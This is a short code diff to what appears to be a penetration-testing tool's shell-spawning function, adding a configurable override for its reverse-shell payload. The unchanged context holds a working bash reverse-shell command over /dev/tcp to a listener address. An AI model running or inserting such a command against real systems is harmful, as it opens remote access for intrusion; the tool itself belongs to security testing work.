@@ -40,6 +40,8 @@ from core.variables import (
     phase1_wrappers
 )
 
+from core.config import PAYLOAD_OVERRIDE
+
 from core.methods.session import session, random_ua
 from core.methods.filecheck import filecheck
 from core.methods.loot import download
@@ -862,6 +864,10 @@ def sheller(
         PAYLOAD = "bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'".format(
             vars.LISTENIP, vars.LISTENPORT,
         )
+        if PAYLOAD_OVERRIDE:
+            PAYLOAD = PAYLOAD_OVERRIDE
+            PAYLOAD = PAYLOAD.replace("<IP>", vars.LISTENIP)
+            PAYLOAD = PAYLOAD.replace("<PORT>", vars.LISTENPORT)
         # don't wait for shell requests to finish, so that
         # script doesn't block & shows if shell worked
         timeout2 = 3.0
